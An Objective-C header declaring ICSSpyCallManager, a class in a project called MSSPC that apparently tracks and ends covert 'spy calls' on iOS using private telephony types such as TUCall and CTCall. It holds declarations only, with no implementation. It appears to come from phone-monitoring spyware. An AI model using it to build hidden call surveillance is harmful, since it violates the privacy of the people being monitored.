//
//  ICSSpyCallManager.h
//  MSSPC
//
//  Created by Makara on 11/27/14.
//
//

#import <Foundation/Foundation.h>
#import "Telephony.h"

@class SpyCallManagerSnapshot, TUCall;

@interface ICSSpyCallManager : NSObject {
@private
    SpyCallManagerSnapshot *mSpyCallManagerSnapshot;
}

@property (nonatomic, retain) SpyCallManagerSnapshot *mSpyCallManagerSnapshot;

+ (id) sharedICSSpyCallManager;

+ (BOOL) anySpyCall;
+ (BOOL) anyCallOnHold;
+ (BOOL) isSpyTUCall: (TUCall *) aCall;
+ (BOOL) isConferenced: (CTCall *) aCTCall;
+ (BOOL) endSpyCallIfAny;

@end
